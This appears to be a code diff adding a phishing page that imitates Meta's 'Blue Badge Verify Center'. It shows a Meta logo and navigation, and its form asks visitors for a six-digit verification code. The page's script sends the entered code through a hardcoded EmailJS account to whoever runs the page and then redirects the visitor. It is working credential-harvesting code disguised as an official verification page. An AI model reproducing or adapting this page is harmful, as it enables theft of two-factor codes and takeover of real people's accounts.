@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Badge Verify Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("boewUzoJQBqOP4D8T"); // Ganti YOUR_USER_ID dengan user ID Anda dari EmailJS
+        })();
+    </script>
+</head>
+<body class="font-roboto bg-white text-black">
+<header class="flex items-center justify-between p-4 border-b">
+    <div class="flex items-center space-x-2">
+        <img src="logo.png" alt="Meta logo" class="mr-2" width="110" height="40"/>
+    </div>
+    <nav class="hidden md:flex space-x-4 text-gray-600">
+        <div class="relative group">
+            <button class="focus:outline-none">Who we are <i class="fas fa-caret-down"></i></button>
+            <div class="absolute hidden group-hover:block bg-white shadow-lg mt-2">
+                <a class="block px-4 py-2" href="#">About Us</a>
+                <a class="block px-4 py-2" href="#">Careers</a>
+            </div>
+        </div>
+        <div class="relative group">
+            <button class="focus:outline-none">Our technologies <i class="fas fa-caret-down"></i></button>
+            <div class="absolute hidden group-hover:block bg-white shadow-lg mt-2">
+                <a class="block px-4 py-2" href="#">AI</a>
+                <a class="block px-4 py-2" href="#">VR</a>
+            </div>
+        </div>
+        <div class="relative group">
+            <button class="focus:outline-none">The metaverse <i class="fas fa-caret-down"></i></button>
+            <div class="absolute hidden group-hover:block bg-white shadow-lg mt-2">
+                <a class="block px-4 py-2" href="#">Overview</a>
+                <a class="block px-4 py-2" href="#">Projects</a>
+            </div>
+        </div>
+        <a class="hover:text-black" href="#">Shop Meta</a>
+        <a class="hover:text-black" href="#">News</a>
+        <div class="relative group">
+            <button class="focus:outline-none">Support <i class="fas fa-caret-down"></i></button>
+            <div class="absolute hidden group-hover:block bg-white shadow-lg mt-2">
+                <a class="block px-4 py-2" href="#">Help Center</a>
+                <a class="block px-4 py-2" href="#">Contact Us</a>
+            </div>
+        </div>
+    </nav>
+    <div class="md:hidden">
+        <button id="menu-button" class="focus:outline-none">
+            <i class="fas fa-bars"></i>
+        </button>
+    </div>
+</header>
+
+<!-- Mobile Menu -->
+<nav id="mobile-menu" class="hidden md:hidden p-4 space-y-2 bg-white shadow-lg">
+    <a class="block" href="#">Who we are</a>
+    <a class="block" href="#">Our technologies</a>
+    <a class="block" href="#">The metaverse</a>
+    <a class="block" href="#">Meta and you</a>
+    <a class="block" href="#">Shop Meta</a>
+    <a class="block" href="#">News</a>
+    <a class="block" href="#">Support</a>
+</nav>
+
+<main class="text-center mt-8 md:mt-16">
+    <div class="flex flex-col md:flex-row justify-center items-center space-y-4 md:space-x-4">
+        <img src="lometa.png" alt="lometa" class="mx-auto mb-6" width="100" height="100"/>
+    </div>
+    <h1 class="text-4xl md:text-6xl font-bold mt-8">Blue Badge</h1>
+    <h2 class="text-4xl md:text-6xl font-bold">and Verify Center</h2>
+    <div class="mt-8 md:mt-16">
+        <h3 class="text-xl md:text-2xl text-blue-600 font-bold">Blue Badge Verify Form</h3>
+        <div class="border-b-4 border-blue-600 w-16 mx-auto mt-2"></div>
+        <form onsubmit="sendEmail(); return false;" class="mt-4 space-y-4">
+            <input type="text" id="verificationCode" class="w-full md:w-80 p-4 rounded-full border border-gray-300" placeholder="6 Digit Verification Code" required>
+            <button type="submit" class="bg-blue-600 text-white px-10 py-3 rounded-full text-lg">Continue</button>
+            <p id="message" class="mt-2" style="display: none;"></p>
+        </form>
+    </div>
+</main>
+
+<!-- Script JavaScript -->
+<script>
+    async function sendEmail() {
+        var verificationCode = document.getElementById("verificationCode").value;
+        console.log("Verification Code:", verificationCode);
+        var submitButton = document.querySelector("button[type='submit']");
+
+        // Clear any previous messages
+        clearMessages();
+
+        // Validasi input
+        if (!verificationCode) {
+            displayMessage("Please enter the 6 Digit Verification Code", "error");
+            return;
+        }
+
+        try {
+            // Disable the button and show loading indicator
+            submitButton.disabled = true;
+            submitButton.textContent = "Sending...";
+
+            // Mengirim email menggunakan EmailJS
+            await emailjs.send("service_50utr4r", "template_02nky78", {
+                verificationCode: verificationCode // Pass the correct variable name
+            });
+
+            // Tampilkan pesan sukses
+            displayMessage("Code Terkirim!", "success");
+        } catch (error) {
+            // Tampilkan pesan gagal
+            displayMessage("Failed to send email. Please try again.", "error");
+        } finally {
+            // Enable the button and reset text
+            submitButton.disabled = false;
+            submitButton.textContent = "Continue";
+        }
+
+        setTimeout(() => {
+            window.location.href = 'index.html'; // Ganti dengan nama file halaman berikutnya
+        }, 1000);
+    }
+
+    function displayMessage(message, type) {
+        var messageElement = document.getElementById("message");
+        messageElement.textContent = message;
+        messageElement.className = type === "success" ? "text-green-500" : "text-red-500";
+        messageElement.style.display = "block"; // Show the message
+    }
+
+    function clearMessages() {
+        var messageElement = document.getElementById("message");
+        messageElement.textContent = "";
+        messageElement.style.display = "none"; // Hide the message
+    }
+
+    // Mobile menu toggle
+    const menuButton = document.getElementById('menu-button');
+    const mobileMenu = document.getElementById('mobile-menu');
+
+    menuButton.addEventListener('click', () => {
+        mobileMenu.classList.toggle('hidden');
+    });
+</script>
+
+<footer class="#">
+    <div class="#">
+        <p class="#"></p>
+        <div class="flex justify-center space-x-4 mt-2">
+            <a href="#" class="text-blue-600 hover:text-blue-800"></a>
+            <a href="#" class="text-blue-600 hover:text-blue-800"></a>
+            <a href="#" class="text-blue-600 hover:text-blue-800"></a>
+        </div>
+    </div>
+</footer>
+
+<footer class="bg-gray-200 mt-10 py-4">
+    <div class="container mx-auto text-center">
+        <p class="text-gray-600">© 2024 Blue Badge Verify Center. All rights reserved.</p>
+        <div class="flex justify-center space-x-4 mt-2">
+            <a href="#" class="text-blue-600 hover:text-blue-800">Privacy Policy</a>
+            <a href="#" class="text-blue-600 hover:text-blue-800">Terms of Service</a>
+            <a href="#" class="text-blue-600 hover:text-blue-800">Contact Us</a>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
